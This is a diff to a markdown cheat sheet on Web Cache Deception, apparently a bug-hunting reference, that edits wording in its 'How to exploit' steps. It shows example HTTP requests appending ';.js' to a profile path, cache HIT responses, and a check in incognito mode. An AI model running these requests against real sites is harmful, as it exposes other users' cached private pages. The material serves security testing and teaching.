@@ -7,7 +7,7 @@ Web Cache Deception is an attack in which an attacker deceives a caching proxy i
 `-`
 
 ## How to exploit
-* Normal Request
+* Normal Request (For example in the settings profile feature)
 ```
 GET /profile/setting HTTP/1.1
 Host: www.vuln.com
@@ -32,9 +32,9 @@ Content-Type: text/html
 Cf-Cache-Status: HIT 
 ...
 ```
-If the response is success, try to open the url in the incognito mode.
+If the `Cf-Cache-Status` response the request with `HIT` not `MISS` or `Error`. And then try to open the url in incognito mode
 
-2. Add `;` before the extension (For example `;.js` / `;.css` / `;.jpg`, etc.)
+1. Add `;` before the extension (For example `;.js` / `;.css` / `;.jpg`, etc.)
 ```
 GET /profile/setting/;.js HTTP/1.1
 Host: www.vuln.com
@@ -46,7 +46,7 @@ Content-Type: text/html
 Cf-Cache-Status: HIT 
 ...
 ```
-If the response is success, try to open the url in the incognito mode.
+If the `Cf-Cache-Status` response the request with `HIT` not `MISS` or `Error`. And then try to open the url in incognito mode
 
 ## References
 * [@bxmbn](https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9)
